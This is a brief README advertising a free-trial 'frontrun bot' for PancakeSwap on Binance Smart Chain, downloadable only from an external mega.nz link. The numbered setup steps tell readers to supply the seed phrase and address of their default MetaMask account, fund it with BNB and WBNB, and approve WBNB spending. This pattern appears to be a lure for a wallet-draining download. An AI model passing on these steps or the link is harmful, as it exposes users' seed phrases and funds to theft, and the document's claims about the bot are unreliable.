#FRONTRUN BOT BSC

**FREE TRIAL LINK**: https://mega.nz/file/19UnzDwC#N17rtxef1spDFbm-G6I6fvVniYM1DbBz6BUtChIWBnU

A simple pancakeswap frontrun bot that purchases the specified token when liquidity is added.

##IMPORTANT NOTES BEFORE RUNNING THE BOT

###1. The bot uses a wallet address and see phrase - this needs to be the FIRST ACCOUNT (Account0 by default) that was created by default when you installed metamask on your pc / macbook.

if this is NOT configured correctly you will get an error that says "(node:45320) UnhandledPromiseRejectionWarning: Error: insufficient funds for intrinsic transaction cost"

###2. Make sure you have the following assets in your MetaMask wallet FOR THE ACCOUNT ADDRESS WITH WHICH YOU ARE USING THE BOT

BNB (this is needed for gas)
WBNB (this is used to purchase the desired token)
IF you want to TEST the bot using WBNB / BUSD, then ADD the BUSD custom token to your MetaMask (0xe9e7cea3dedca5984780bafc599bd69add087d56)
Run the bot using the to_Purchase value of the BUSD token contract. This works because liquidity is frequently added to this pool.

###3. APPROVE WBNB in your MetaMask

you need to approve your wallet to spend WBNB in order for the bot to be able to make purchases
to do this, go to pancakeswap, and in FROM put WBNB, and in the TO put elongate (0x2A9718defF471f3Bb91FA0ECEAB14154F150a385), and click 'Approve'.
confirm the transaction in MetaMask
Now WBNB should be approved, and the purchase transactions the bot will make on your wallets behalf using WBNB will not fail.
